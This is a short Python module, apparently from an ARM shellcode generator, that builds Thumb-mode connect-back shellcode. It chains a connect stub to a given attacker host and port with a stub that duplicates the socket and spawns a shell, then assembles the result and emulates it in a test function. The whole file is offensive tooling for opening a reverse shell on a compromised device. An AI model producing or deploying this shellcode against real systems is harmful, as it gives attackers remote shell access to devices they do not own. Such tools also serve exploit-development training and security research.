# connection back

from socket import htons, inet_aton, gethostbyname
from struct import unpack

import connect
import dupsh


def binary_ip(host):
    return inet_aton(gethostbyname(host))

def u32(u):
    return unpack("<I", u)[0]

def generate(host='127.0.0.1', port=31337, version=3, sock='r6'):
    """connection back to attacker with pwn shell on specific port in Thumb Mode

    argument:
        host (str)    : specific IP address or hostname
        port (int/str): specific port
        version(int)  : 2 is old linux kernel including 2.x (default: 3)
        sock (int/str): sock descriptor for dupsh()
    """
    sc =  connect.generate(host, port, version)
    sc += dupsh.generate(sock)

    return sc    

def testcase(host='127.0.0.1', port=31337, version=3, sock='r6'):
    import ARMSCGen as scgen
    sc = scgen.ks_asm('thumb', generate(host, port, version, sock))[0]
    sclen = len(sc)
    print "[+] Registers information"
    scgen.UC_TESTSC(sc, sclen, scgen.UC_ARCH_ARM, scgen.UC_MODE_THUMB, False)
